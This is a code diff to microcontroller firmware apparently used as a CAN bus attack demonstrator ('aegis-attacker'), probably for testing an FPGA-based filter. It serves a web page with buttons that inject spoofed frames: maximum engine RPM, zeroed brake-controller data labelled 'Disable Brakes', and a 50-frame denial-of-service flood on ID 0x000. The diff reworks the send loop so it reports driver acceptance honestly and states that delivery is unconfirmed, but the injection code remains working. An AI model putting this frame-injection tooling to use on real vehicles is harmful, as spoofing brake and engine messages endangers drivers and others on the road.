@@ -46,7 +46,7 @@ const char index_html[] PROGMEM = R"rawliteral(
         <button class="btn" onclick="attack('dos')">Flood: Bus Denial of Service (0x000)</button>
         
         <div id="terminal">
-            <div class="log-entry">root@aegis-attacker:~# Connected to CAN bus.</div>
+            <div class="log-entry">root@aegis-attacker:~# Injector UI loaded; CAN delivery unconfirmed.</div>
             <div class="log-entry">root@aegis-attacker:~# Ready to inject frames...</div>
         </div>
     </div>
@@ -87,6 +87,7 @@ void handleAttack() {
     String type = server.arg("type");
     struct can_frame frame;
     String responseMsg = "";
+    unsigned int attempts = 1;
 
     if (type == "rpm") {
         // Spoof Engine RPM (e.g., ID 0x100)
@@ -96,9 +97,6 @@ void handleAttack() {
         frame.data[1] = 0xFF;
         for (int i = 2; i < 8; i++) frame.data[i] = 0x00;
         
-        mcp2515.sendMessage(&frame);
-        responseMsg = "SUCCESS: Frame 0x100 (Max RPM) injected into bus.";
-        Serial.println("Sent RPM Attack");
 
     } else if (type == "brakes") {
         // Spoof Brake Controller (e.g., ID 0x050)
@@ -106,9 +104,6 @@ void handleAttack() {
         frame.can_dlc = 8;
         for (int i = 0; i < 8; i++) frame.data[i] = 0x00; // Zero out brakes
         
-        mcp2515.sendMessage(&frame);
-        responseMsg = "SUCCESS: Frame 0x050 (Disable Brakes) injected into bus.";
-        Serial.println("Sent Brake Attack");
 
     } else if (type == "dos") {
         // Denial of Service: Flood the bus with dominant ID (0x000)
@@ -116,17 +111,26 @@ void handleAttack() {
         frame.can_dlc = 8;
         for (int i = 0; i < 8; i++) frame.data[i] = 0x00;
         
-        // Send 50 frames rapidly
-        for (int i = 0; i < 50; i++) {
-            mcp2515.sendMessage(&frame);
-            delay(1);
-        }
-        responseMsg = "SUCCESS: 50 Dominant frames (0x000) flooded.";
-        Serial.println("Sent DoS Attack");
+        attempts = 50;
 
     } else {
-        responseMsg = "ERROR: Unknown payload.";
+        server.send(400, "text/plain", "Unknown payload type");
+        return;
     }
+
+    unsigned int submitted = 0;
+    int lastError = 0;
+    for (unsigned int i = 0; i < attempts; ++i) {
+        MCP2515::ERROR result = mcp2515.sendMessage(&frame);
+        if (result == MCP2515::ERROR_OK) ++submitted;
+        else lastError = static_cast<int>(result);
+        if (attempts > 1) delay(1);
+    }
+    responseMsg = "TX requests: " + String(attempts) +
+                  "; driver accepted: " + String(submitted) +
+                  "; driver errors: " + String(attempts - submitted) +
+                  "; last error code: " + String(lastError) +
+                  ". Delivery and FPGA blocking are UNCONFIRMED.";
 
     server.send(200, "text/plain", responseMsg);
 }
